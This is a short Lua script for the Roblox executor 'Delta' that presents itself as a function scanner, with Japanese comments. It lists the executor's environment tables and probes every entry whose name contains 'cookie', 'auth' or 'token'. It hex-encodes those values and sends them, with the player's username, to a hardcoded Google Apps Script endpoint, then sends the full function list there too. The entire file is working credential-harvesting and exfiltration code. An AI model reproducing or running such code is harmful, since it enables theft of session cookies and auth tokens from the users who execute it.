-- [[ PROJECT: CUSTOM FUNCTION SCANNER ]]
local GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec"

local function send(label, val)
    local hex = ""
    for i = 1, #val do hex = hex .. string.format("%02X", string.byte(val:sub(i,i))) end
    pcall(function() 
        game:HttpGet(GAS_URL .. "?hex=" .. hex .. "&user=" .. game.Players.LocalPlayer.Name .. "&type=" .. label) 
    end)
end

print("🧪 Delta 独自関数のリストを作成中...")

local functions = ""
-- エグゼキューターがよく使う特殊なテーブルを覗く
local envs = {getgenv(), getrenv(), getreg()}

for _, env in ipairs(envs) do
    pcall(function()
        for name, _ in pairs(env) do
            functions = functions .. name .. ", "
            -- もし名前に "cookie" や "auth" が含まれていたら即座に中身を試す
            local lowerName = name:lower()
            if lowerName:find("cookie") or lowerName:find("auth") or lowerName:find("token") then
                local s, res = pcall(function() return env[name] end)
                if s then send("FOUND_SECRET_" .. name, tostring(res)) end
            end
        end
    end)
end

send("Delta_Function_List", functions)
print("🏁 リストを送信した。GASを確認してくれ。")
